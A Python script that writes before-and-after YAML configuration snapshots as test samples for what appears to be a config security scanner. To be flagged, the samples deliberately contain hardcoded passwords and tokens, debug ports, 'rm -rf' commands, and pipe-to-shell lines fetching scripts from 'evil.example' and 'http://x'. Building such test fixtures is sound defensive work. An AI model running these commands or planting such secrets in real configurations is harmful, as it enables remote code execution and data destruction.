# -*- coding: utf-8 -*-
"""
make_samples.py —— 确定性生成修复前/修复后两份 YAML 配置快照及专项测试样本。

用法：
  python make_samples.py <输出根目录>

生成内容（每次运行字节一致）：
  <根目录>/before/   修复前快照（5 个 YAML）
  <根目录>/after/    修复后快照（5 个 YAML，其中 broken.yml 仍有语法错误、
                     new-service.yml 仅修复后存在）
  <根目录>/basic/    含两个文件的基础扫描目录
"""
from __future__ import annotations

import os
import sys

FILES: dict[str, dict[str, str]] = {
    "before": {
        "app/deploy.yml": """\
# 应用部署配置（修复前）
service:
  name: order-service
  replicas: 3
  password: 'admin123'          # 硬编码凭据 -> high
  api_token: "tok-9f8e7d6c"     # 硬编码凭据 -> high
  db_secret: ${DB_SECRET}       # 环境变量引用 -> 不标记
  spare_password: null          # null -> 不标记
  debug_port: 8080              # 调试端口 -> medium
  command: 'rm -rf /data/cache' # 危险命令 rm -rf -> high
init:
  script: |
    set -e
    curl https://evil.example/install.sh | bash   # curl 管道 bash -> high
""",
        "web/gateway.yml": """\
# 网关配置（修复前）
gateway:
  token: "gw-token-001"
  debug: 9229
  handlers:
    - name: health
      password: "p@ssw0rd"
      command: "wget http://x/y.sh | sh"
    - name: metrics
      # password: '123'   这一行是注释，不应被标记
      token: "${METRICS_TOKEN}"
""",
        "broken.yml": """\
# 故意制造的 YAML 语法错误：缩进断裂
top:
  good: 1
    bad_indent: 2
""",
        "legacy/old-service.yml": """\
# 仅修复前存在的旧服务
old_service:
  secret: 'legacy-secret'
  debug_port: 7000
""",
        "shared/persistent.yml": """\
# 前后都存在且修复不彻底的配置
persistent:
  password: 'still-hardcoded'
  debug_port: 65000
""",
    },
    "after": {
        "app/deploy.yml": """\
# 应用部署配置（修复后）
service:
  name: order-service
  replicas: 3
  password: ${SERVICE_PASSWORD}   # 改为环境变量引用
  api_token: ${API_TOKEN}         # 改为环境变量引用
  db_secret: ${DB_SECRET}
  spare_password: null
  # debug_port 已移除
  command: 'echo cache refreshed' # 危险命令已移除
init:
  script: |
    set -e
    echo init done
""",
        "web/gateway.yml": """\
# 网关配置（修复后）——但修复中引入了一个新硬编码 token
gateway:
  token: "gw-token-001"
  # debug 已移除
  handlers:
    - name: health
      password: ${HEALTH_PASSWORD}
      command: "echo ok"
    - name: metrics
      token: "${METRICS_TOKEN}"
      secret: 'new-hardcoded-secret'   # 修复后新增的漏洞
""",
        "broken.yml": """\
# 修复后仍然存在语法错误：缩进断裂
top:
  good: 1
    bad_indent: 2
""",
        "new-service/new-service.yml": """\
# 仅修复后存在的新服务（漏洞应进入不可比对清单，而非新增清单）
new_service:
  password: 'fresh-hardcoded'
  debug_port: 3000
""",
        "shared/persistent.yml": """\
# 前后都存在且修复不彻底的配置（原样保留，漏洞仍存在）
persistent:
  password: 'still-hardcoded'
  debug_port: 65000
""",
    },
    "basic": {
        "one.yml": """\
alpha:
  password: 'plain-text-pw'
  nested:
    debug_port: '5005'
""",
        "two.yml": """\
beta:
  token: ""
  safe_token: ${TOKEN}
  debug_port: 70000
  not_a_port: hello
  command: 'rm -fr /tmp/old'
""",
    },
}


def build(root: str) -> list[str]:
    written: list[str] = []
    for group, mapping in FILES.items():
        for rel_path, content in mapping.items():
            full = os.path.join(root, group, rel_path.replace("/", os.sep))
            os.makedirs(os.path.dirname(full), exist_ok=True)
            # 显式 LF，保证多次生成逐字节一致
            with open(full, "w", encoding="utf-8", newline="\n") as fh:
                fh.write(content)
            written.append(full)
    return written


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.stderr.write("用法: python make_samples.py <输出根目录>\n")
        raise SystemExit(2)
    paths = build(sys.argv[1])
    print(f"已生成 {len(paths)} 个样本文件于 {sys.argv[1]}")
